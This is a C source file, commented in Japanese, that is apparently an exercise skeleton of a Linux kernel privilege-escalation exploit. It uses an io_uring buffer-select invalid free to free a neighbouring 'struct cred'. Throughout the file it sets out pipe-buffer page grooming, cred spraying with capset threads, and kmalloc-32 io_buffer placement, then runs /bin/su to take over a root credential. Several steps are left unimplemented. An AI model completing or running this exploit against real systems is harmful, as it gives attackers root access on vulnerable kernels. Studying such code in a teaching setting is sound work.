#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#define UNIMPLEMENTED() assert(0 && "unimplemented")
#define UNIMPLEMENTED_(n) (n)
#define errExit(msg)    \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define WAIT()            \
  do {                    \
    puts("[WAITING...]"); \
    getchar();            \
  } while (0)
#define ulong unsigned long
#define PAGE 0x1000UL

#define NUM_IOBUF \
  0x23D  // UNIMPLEMENTED:
         // 微調整して最後のio_bufferがページの最後の方に来るように
char iobufs[PAGE][NUM_IOBUF] = {0};

/**
 * @brief thread間で共有する状態
 */
struct state {
  // pipe_bufferによるページ分割が終わったかどうか
  int page_split;
  // setcap()によるcred sprayを終えたスレッド数
  int cred_spray_num;
  // credがInvalid Freeされたかどうか
  int cred_uafed;
  // credが特権に置き換わったかどうか
  int pwned;
};

struct state *state;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void pinning_thread(int core) {
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(core, &mask);

  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
    errExit("pthread_setaffinity_np");
  }
}

/**
 * @brief スレッド間で共有できるstateを初期化する
 *
 * @return struct state* 共有されるstate
 */
struct state *initialize_shared_state(void) {
  int shm_id = shmget(IPC_PRIVATE, PAGE, 0666 | IPC_CREAT);
  if (shm_id < 0) errExit("shmget");

  return (struct state *)shmat(shm_id, NULL, 0);
}

/**
 * /proc/self/mapsを開く
 *
 * @return int /proc/self/mapsのfd
 */
int open_maps(void) {
  int fd = open("/proc/self/maps", O_RDONLY);
  assert(fd >= 2);
  return fd;
}

/**
 * @brief io_uringをセットアップする
 *
 * @param ring io_uring
 */
void init_uring(struct io_uring *ring) { io_uring_queue_init(1024, ring, 0); }

/**
 * @brief Buffer Group を使ってreadする
 *
 * @param ring io_uring
 * @param fd readしたいファイルのfd
 * @param size readするサイズ
 * @param offset readするオフセット
 * @param bgid Buffer Group の BGID(Buffer Group ID)
 */
void ring_submit_read(struct io_uring *ring, int fd, size_t size, ulong offset,
                      int bgid) {
  struct io_uring_sqe *sqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_read(sqe, fd, NULL, size, offset);
  // Buffer Groupを使うようにフラグを設定
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  // BGIDを設定 (struct io_uring_sqeの定義を参考)
  sqe->buf_group = bgid;
  // kernelに通知する
  io_uring_submit(ring);
}

/**
 * @brief Buffer Groupをkernelと共有する
 *
 * @param ring io_uring
 * @param buf_addr 共有したいバッファの先頭アドレス
 * @param len 共有したいバッファの1つ分のサイズ
 * @param num 共有したいバッファの数
 * @param bgid 共有したい Buffer Group の Group ID
 * @param bid_start 共有したい Buffer Group の Buffer ID の開始番号
 */
void ring_submit_buffer(struct io_uring *ring, char *buf_addr, int len, int num,
                        int bgid, int bid_start) {
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_provide_buffers(sqe, buf_addr, len, num, bgid, bid_start);
  // kernelに通知する
  assert(io_uring_submit(ring) >= 0);
}

/**
 * @brief CQにレスポンスが返ってくるまで待つ
 *
 * @return int CQEのres (使われたバッファのBID)
 *
 * @param ring io_uring
 */
int ring_wait_cqe(struct io_uring *ring) {
  struct io_uring_cqe *cqe = NULL;
  int ret;

  // レスポンスが返ってきたCQEを取得する
  io_uring_wait_cqe(ring, &cqe);
  assert(cqe->res >= 0);
  ret = cqe->res;
  io_uring_cqe_seen(ring, cqe);
  return ret;
}

/**
 * @brief `struct cred`をいいタイミングで確保するスレッド関数
 *
 * @param arg
 * @return void*
 */
void *setcap_worker(void *arg) {
  struct __user_cap_header_struct cap_header = {
      .version = _LINUX_CAPABILITY_VERSION_1,
      .pid = gettid(),
  };
  struct __user_cap_data_struct cap_data;

  /**
   * capset()の下準備をする
   */
  if (capget(&cap_header, &cap_data) < 0) errExit("capget");
  cap_data.effective = 0x0;
  cap_data.permitted = 0x0;
  cap_data.inheritable = 0x0;

  /**
   * pipe_bufferによるページ分割が終わるまで待つ
   */
  while (state->page_split == 0) {
    usleep(1000);
  }

  /**
   * `struct cred`を奇数ページから確保する
   */
  pthread_mutex_lock(&lock);
  {
    pinning_thread(0);
    if (capset(&cap_header, &cap_data) < 0) errExit("capset");
    ++state->cred_spray_num;
  }
  pthread_mutex_unlock(&lock);

  sleep(9999);  // EOL
  return NULL;
}

/**
 * @brief 合図を受けたら`/bin/su`を実行する。つまり特権のcredを確保する。
 *
 * @param arg
 * @return void*
 */
void *su_worker(void *arg) {
  while (state->cred_uafed == 0) {
    usleep(1000);
  }

  pinning_thread(0);
  system("/bin/su");

  sleep(99999);

  return NULL;
}

int main(void) {
  struct io_uring ring;
  int fd = open_maps();
  pinning_thread(0);

  // ringの初期化
  init_uring(&ring);

  /**
   * スレッド間で情報を共有するためのメモリ領域を用意する。
   */
  puts("[+] Initiating shared state...");
  state = initialize_shared_state();

/**
 * capsetをしてくれるスレッドを用意する。
 */
#define CAPSET_THREAD_NUM 0x50
  puts("[+] Creating capset threads...");
  pthread_t setcap_pids[CAPSET_THREAD_NUM];
  UNIMPLEMENTED();

  /**
   * /bin/suを実行してくれるスレッドを用意する
   */
#define SU_THREAD_NUM 0x5
  puts("[+] Creating su threads...");
  pthread_t su_pids[SU_THREAD_NUM];
  UNIMPLEMENTED();

  /**
   * スレッドが作成されるまで少し待つ
   */
  usleep(1000);
  pinning_thread(0);

  /**
   * 大量のパイプを用意する
   */
#define SPRAY_PIPE_NUM 0x60
  puts("[+] Creating pipe buffers...");
  int pipefds[SPRAY_PIPE_NUM][2];
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    if (pipe(pipefds[ix]) < 0) errExit("pipe");
  }
  usleep(5000);

  /**
   * pipeに書き込むことでページを確保する。
   * 大量に確保することで、Buddy
   * AllocatorのOrder-1以上のリストからページをSplitしてくる。
   */
  puts("[+] Draining pages from higher order lists...");
  UNIMPLEMENTED();

  /**
   * 偶数番目のpipeを閉じることでバッファ(ページ)を解放してBuddy(Order-0)に返却する。
   * NOTE: ここで連続するページを解放してしまうと、
   * 　Buddy AllocatorがページをマージしてOrder-1以上に持っていってしまう。
   */
  pinning_thread(0);
  puts("[+] Closing even pages...");
  UNIMPLEMENTED();

  /**
   * capsetスレッドに対して、pipe_bufferによるページ分割が終わったことを通知する。
   * これを合図にcapsetスレッドは`struct cred`を奇数ページから確保する。
   */
  UNIMPLEMENTED();

  /**
   * credのスプレーが終わるまで待つ。
   */
  while (state->cred_spray_num < CAPSET_THREAD_NUM) {
    usleep(1000);
  }
  pinning_thread(0);

  /**
   * 奇数番目のpipeを閉じてBuddy(Order-0)に返却する。
   * このページはのちほどkmalloc-32(io_buffer)用に利用する。
   */
  puts("[+] Closing odd pages...");
  UNIMPLEMENTED();

  /**
   * 大量の`io_buffer`をkmalloc-32に確保する。
   * キャッシュページが足りなくなると、SLUBはBuddyに対してページを要求し、
   * 先程解放した偶数ページが利用されることになる。
   */
  puts("[+] Allocating io_buffer in odd pages...");
  UNIMPLEMENTED();

  /**
   * io_bufferのinvalid freeを使って次のページにあるcredをfreeする。
   */
  const ulong cred_offset =
      0x140;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
  ring_submit_read(&ring, fd, cred_offset, 0, 0);
  assert(ring_wait_cqe(&ring) == cred_offset);

  /**
   * `/bin/su`を実行するように合図する
   */
  UNIMPLEMENTED();

  sleep(9999);  // unreachable

  return 0;
}
